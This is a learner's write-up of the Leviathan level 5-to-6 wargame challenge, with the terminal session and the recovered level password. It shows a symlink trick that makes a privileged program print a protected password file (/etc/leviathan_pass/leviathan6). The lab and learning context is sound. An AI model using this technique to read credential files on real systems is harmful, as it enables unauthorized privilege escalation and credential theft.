# Leviathan Level 5 -> 6

**Password:** YZ55XPVk2l

## Solution


So I tried running the given program and it told that it cant find the tmp/file.log. Next step I thought since it currently doesnt exist what if I just create that file with random text in it, in case the program doesnt actually validate the info within that file. So I created that file in a given path and ran the program again and it seems it just prints thats inside the file and deletes the file.log. So I was stuck for a while on this level and spent some time googling what I can do. So apparently since ./leviathan5 is being run through leviathan6 privileges, would it be possible to use the given program linked to the etc/leviathan_pass/ directory to read the contents of the password? Turns out we can actually do something like by using symbolic links, which I remember from the OS course I took when were going over the linux file structure and how they can be used as either a shortcut or read the files. So by creating a symbolic link between the path where the password is located with the tmp/file.log, if we run the leviathan5 program it should read the contents of the password file the same way it was just reading the contents ofthe file.log. To be honest to this I’m not sure how symbolic links work in linux, I should try reading more about this and that can definetely be an area of vulnerabitlity hackers typically exploit. 

leviathan5@gibson:~$ ls
leviathan5
leviathan5@gibson:~$ cat /tmp/file.log
cat: /tmp/file.log: No such file or directory
leviathan5@gibson:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@gibson:~$ touch /tmp/file.log ; echo "hello" > /tmp/file.log
leviathan5@gibson:~$ ./leviathan5 
hello
leviathan5@gibson:~$ touch /tmp/file.log ; echo "hello" > /tmp/file.log
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
ln: failed to create symbolic link '/tmp/file.log': File exists
leviathan5@gibson:~$ ls
leviathan5
leviathan5@gibson:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ./leviathan5 
YZ55XPVk2l
